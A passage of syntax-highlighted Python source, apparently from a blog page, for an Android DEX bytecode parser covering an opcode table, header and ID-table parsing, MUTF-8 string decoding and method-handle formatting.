class="literal">None</span>),</span><br><span class="line">    <span class="number">0xde</span>: (<span class="string">&quot;or-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xdf</span>: (<span class="string">&quot;xor-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe0</span>: (<span class="string">&quot;shl-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe1</span>: (<span class="string">&quot;shr-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xe2</span>: (<span class="string">&quot;ushr-int/lit8&quot;</span>, <span class="string">&quot;22b&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x0100</span>: (<span class="string">&quot;packed-switch-payload&quot;</span>, <span class="string">&quot;pswitch-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0200</span>: (<span class="string">&quot;sparse-switch-payload&quot;</span>, <span class="string">&quot;sswitch-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0300</span>: (<span class="string">&quot;array-payload&quot;</span>, <span class="string">&quot;array-payload&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0xfa</span>: (<span class="string">&quot;invoke-polymorphic&quot;</span>, <span class="string">&quot;45cc&quot;</span>, <span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">    <span class="number">0xfb</span>: (<span class="string">&quot;invoke-polymorphic/range&quot;</span>, <span class="string">&quot;4rcc&quot;</span>, <span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">    <span class="number">0xfc</span>: (<span class="string">&quot;invoke-custom&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">5</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xfd</span>: (<span class="string">&quot;invoke-custom/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">5</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xfe</span>: (<span class="string">&quot;const-method-handle&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">6</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xff</span>: (<span class="string">&quot;const-method-type&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">4</span>, <span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_name</span>(<span class="params">r: <span class="built_in">int</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    locals_size = <span class="built_in">max</span>(<span class="number">0</span>, regs_size - ins_size)</span><br><span class="line">    <span class="keyword">if</span> r &gt;= locals_size:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;p<span class="subst">&#123;r - locals_size&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;v<span class="subst">&#123;r&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ref_kind_name</span>(<span class="params">kind: <span class="type">Optional</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> kind <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ref&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&quot;type&quot;</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="string">&quot;method&quot;</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="string">&quot;proto&quot;</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="string">&quot;call_site&quot;</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="string">&quot;method_handle&quot;</span>,</span><br><span class="line">    &#125;.get(kind, <span class="string">&quot;ref&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DexFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.data: <span class="built_in">bytes</span> = f.read()</span><br><span class="line">        <span class="variable language_">self</span>.size = <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br><span class="line">        <span class="variable language_">self</span>._parse_header()</span><br><span class="line">        <span class="variable language_">self</span>._parse_primary_tables()</span><br><span class="line">        <span class="variable language_">self</span>._parse_map_list()</span><br><span class="line">        <span class="variable language_">self</span>._mh_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._mh_off = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._cs_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._cs_off = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_items.get(<span class="number">0x0008</span>):  <span class="comment"># TYPE_METHOD_HANDLE_ITEM</span></span><br><span class="line">            <span class="variable language_">self</span>._mh_count, <span class="variable language_">self</span>._mh_off = <span class="variable language_">self</span>.map_items[<span class="number">0x0008</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_items.get(<span class="number">0x0007</span>):  <span class="comment"># TYPE_CALL_SITE_ID_ITEM</span></span><br><span class="line">            <span class="variable language_">self</span>._cs_count, <span class="variable language_">self</span>._cs_off = <span class="variable language_">self</span>.map_items[<span class="number">0x0007</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u1</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[off]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u2</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="variable language_">self</span>.data, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_u4</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="variable language_">self</span>.data, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_bytes</span>(<span class="params">self, off: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data[off:off + n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_header</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.size &lt; <span class="number">0x70</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;DEX 文件过小&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.magic = <span class="variable language_">self</span>._<span class="built_in">bytes</span>(<span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line">        <span class="variable language_">self</span>.file_size = <span class="variable language_">self</span>._u4(<span class="number">0x20</span>)</span><br><span class="line">        <span class="variable language_">self</span>.header_size = <span class="variable language_">self</span>._u4(<span class="number">0x24</span>)</span><br><span class="line">        <span class="variable language_">self</span>.endian_tag = <span class="variable language_">self</span>._u4(<span class="number">0x28</span>)</span><br><span class="line">        <span class="variable language_">self</span>.map_off = <span class="variable language_">self</span>._u4(<span class="number">0x34</span>)</span><br><span class="line">        <span class="variable language_">self</span>.string_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x38</span>)</span><br><span class="line">        <span class="variable language_">self</span>.string_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x3C</span>)</span><br><span class="line">        <span class="variable language_">self</span>.type_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x40</span>)</span><br><span class="line">        <span class="variable language_">self</span>.type_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x44</span>)</span><br><span class="line">        <span class="variable language_">self</span>.proto_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x48</span>)</span><br><span class="line">        <span class="variable language_">self</span>.proto_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x4C</span>)</span><br><span class="line">        <span class="variable language_">self</span>.field_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x50</span>)</span><br><span class="line">        <span class="variable language_">self</span>.field_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x54</span>)</span><br><span class="line">        <span class="variable language_">self</span>.method_ids_size = <span class="variable language_">self</span>._u4(<span class="number">0x58</span>)</span><br><span class="line">        <span class="variable language_">self</span>.method_ids_off = <span class="variable language_">self</span>._u4(<span class="number">0x5C</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_primary_tables</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._string_offs: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.string_ids_size):</span><br><span class="line">            <span class="variable language_">self</span>._string_offs.append(<span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.string_ids_off + i * <span class="number">4</span>))</span><br><span class="line">        <span class="variable language_">self</span>._string_cache: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._type_str_idx: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.type_ids_size):</span><br><span class="line">            <span class="variable language_">self</span>._type_str_idx.append(<span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.type_ids_off + i * <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._proto_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.proto_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.proto_ids_off + i * <span class="number">12</span></span><br><span class="line">            shorty_idx = <span class="variable language_">self</span>._u4(off + <span class="number">0</span>)</span><br><span class="line">            return_type_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            parameters_off = <span class="variable language_">self</span>._u4(off + <span class="number">8</span>)</span><br><span class="line">            <span class="variable language_">self</span>._proto_list.append((shorty_idx, return_type_idx, parameters_off))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._field_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.field_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.field_ids_off + i * <span class="number">8</span></span><br><span class="line">            class_idx = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            type_idx = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            name_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            <span class="variable language_">self</span>._field_list.append((class_idx, type_idx, name_idx))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._method_list: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.method_ids_size):</span><br><span class="line">            off = <span class="variable language_">self</span>.method_ids_off + i * <span class="number">8</span></span><br><span class="line">            class_idx = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            proto_idx = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            name_idx = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            <span class="variable language_">self</span>._method_list.append((class_idx, proto_idx, name_idx))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_parse_map_list</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.map_items: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]] = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.map_off == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        size = <span class="variable language_">self</span>._u4(<span class="variable language_">self</span>.map_off)</span><br><span class="line">        off = <span class="variable language_">self</span>.map_off + <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            <span class="keyword">if</span> off + <span class="number">12</span> &gt; <span class="variable language_">self</span>.size:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            typ = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">            _unused = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">            count = <span class="variable language_">self</span>._u4(off + <span class="number">4</span>)</span><br><span class="line">            item_off = <span class="variable language_">self</span>._u4(off + <span class="number">8</span>)</span><br><span class="line">            <span class="variable language_">self</span>.map_items[typ] = (count, item_off)</span><br><span class="line">            off += <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_uleb128</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        shift = <span class="number">0</span></span><br><span class="line">        pos = off</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            b = <span class="variable language_">self</span>._u1(pos)</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            result |= (b &amp; <span class="number">0x7F</span>) &lt;&lt; shift</span><br><span class="line">            <span class="keyword">if</span> (b &amp; <span class="number">0x80</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            shift += <span class="number">7</span></span><br><span class="line">        <span class="keyword">return</span> result, pos</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_read_mutf8_at</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]:</span><br><span class="line">        _, pos = <span class="variable language_">self</span>._uleb128(off)</span><br><span class="line">        chars: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            b0 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> b0 == <span class="number">0x00</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> b0 &lt; <span class="number">0x80</span>:</span><br><span class="line">                chars.append(<span class="built_in">chr</span>(b0))</span><br><span class="line">            <span class="keyword">elif</span> (b0 &amp; <span class="number">0xE0</span>) == <span class="number">0xC0</span>:</span><br><span class="line">                b1 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                code = ((b0 &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">6</span>) | (b1 &amp; <span class="number">0x3F</span>)</span><br><span class="line">                <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">                    chars.append(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b1 = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                b2 = <span class="variable language_">self</span>._u1(pos + <span class="number">1</span>);</span><br><span class="line">                pos += <span class="number">2</span></span><br><span class="line">                code = ((b0 &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">12</span>) | ((b1 &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (b2 &amp; <span class="number">0x3F</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0xD800</span> &lt;= code &lt;= <span class="number">0xDBFF</span>:</span><br><span class="line">                    b0n = <span class="variable language_">self</span>._u1(pos);</span><br><span class="line">                    b1n = <span class="variable language_">self</span>._u1(pos + <span class="number">1</span>);</span><br><span class="line">                    b2n = <span class="variable language_">self</span>._u1(pos + <span class="number">2</span>);</span><br><span class="line">                    pos += <span class="number">3</span></span><br><span class="line">                    code2 = ((b0n &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">12</span>) | ((b1n &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (b2n &amp; <span class="number">0x3F</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0xDC00</span> &lt;= code2 &lt;= <span class="number">0xDFFF</span>:</span><br><span class="line">                        cp = <span class="number">0x10000</span> + (((code - <span class="number">0xD800</span>) &lt;&lt; <span class="number">10</span>) | (code2 - <span class="number">0xDC00</span>))</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(cp))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(code2))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars), pos</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.string_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> idx <span class="keyword">in</span> <span class="variable language_">self</span>._string_cache:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._string_cache[idx]</span><br><span class="line">        off = <span class="variable language_">self</span>._string_offs[idx]</span><br><span class="line">        <span class="keyword">if</span> off &lt;= <span class="number">0</span> <span class="keyword">or</span> off &gt;= <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        s, _ = <span class="variable language_">self</span>._read_mutf8_at(off)</span><br><span class="line">        <span class="variable language_">self</span>._string_cache[idx] = s</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_type_desc</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.type_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        sidx = <span class="variable language_">self</span>._type_str_idx[idx]</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.get_string(sidx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_type_list</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> off == <span class="number">0</span> <span class="keyword">or</span> off &gt;= <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        size = <span class="variable language_">self</span>._u4(off)</span><br><span class="line">        types: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        p = off + <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            t_idx = <span class="variable language_">self</span>._u2(p)</span><br><span class="line">            p += <span class="number">2</span></span><br><span class="line">            desc = <span class="variable language_">self</span>.get_type_desc(t_idx)</span><br><span class="line">            types.append(desc <span class="keyword">if</span> desc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(t_idx)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> types</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_proto_sig</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.proto_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        shorty_idx, ret_type_idx, params_off = <span class="variable language_">self</span>._proto_list[idx]</span><br><span class="line">        ret = <span class="variable language_">self</span>.get_type_desc(ret_type_idx) <span class="keyword">or</span> <span class="string">&quot;V&quot;</span></span><br><span class="line">        params = <span class="variable language_">self</span>._get_type_list(params_off)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(params)&#125;</span>)<span class="subst">&#123;ret&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_field_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.field_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        class_idx, type_idx, name_idx = <span class="variable language_">self</span>._field_list[idx]</span><br><span class="line">        owner = <span class="variable language_">self</span>.get_type_desc(class_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(class_idx)&#125;</span>&quot;</span></span><br><span class="line">        ftype = <span class="variable language_">self</span>.get_type_desc(type_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(type_idx)&#125;</span>&quot;</span></span><br><span class="line">        name = <span class="variable language_">self</span>.get_string(name_idx) <span class="keyword">or</span> <span class="string">f&quot;string@<span class="subst">&#123;hex32(name_idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;owner&#125;</span>-&gt;<span class="subst">&#123;name&#125;</span>:<span class="subst">&#123;ftype&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_method_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.method_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        class_idx, proto_idx, name_idx = <span class="variable language_">self</span>._method_list[idx]</span><br><span class="line">        owner = <span class="variable language_">self</span>.get_type_desc(class_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(class_idx)&#125;</span>&quot;</span></span><br><span class="line">        name = <span class="variable language_">self</span>.get_string(name_idx) <span class="keyword">or</span> <span class="string">f&quot;string@<span class="subst">&#123;hex32(name_idx)&#125;</span>&quot;</span></span><br><span class="line">        sig = <span class="variable language_">self</span>.get_proto_sig(proto_idx) <span class="keyword">or</span> <span class="string">f&quot;proto@<span class="subst">&#123;hex16(proto_idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;owner&#125;</span>-&gt;<span class="subst">&#123;name&#125;</span><span class="subst">&#123;sig&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_call_site_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._cs_off == <span class="number">0</span> <span class="keyword">or</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>._cs_count:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        entry_off = <span class="variable language_">self</span>._u4(<span class="variable language_">self</span>._cs_off + idx * <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;call_site@<span class="subst">&#123;hex32(entry_off)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_method_handle_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._mh_off == <span class="number">0</span> <span class="keyword">or</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>._mh_count:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        off = <span class="variable language_">self</span>._mh_off + idx * <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> off + <span class="number">8</span> &gt; <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        mh_type = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">        _unused = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">        target_id = <span class="variable language_">self</span>._u2(off + <span class="number">4</span>)</span><br><span class="line">        _unused2 = <span class="variable language_">self</span>._u2(off + <span class="number">6</span>)</span><br><span class="line">        target_field = <span class="variable language_">self</span>.get_field_str(target_id)</span><br><span class="line">        target_method = <span class="variable language_">self</span>.get_method_str(target_id)</span><br><span class="line">        target = target_method <span class="keyword">if</span> target_method <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> target_field</span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            target = <span class="string">f&quot;id@<span class="subst">&#123;hex16(target_id)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;method_handle[kind=<span class="subst">&#123;mh_type&#125;</span>] <span class="subst">&#123;target&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">format_ref</span>(<span class="params">self, kind: <span class="type">Optional</span>[<span class="built_in">int</span>], idx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> kind <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;ref@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">0</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_string(idx)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;\&quot;<span class="subst">&#123;s&#125;</span>\&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;string@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">1</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_type_desc(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> 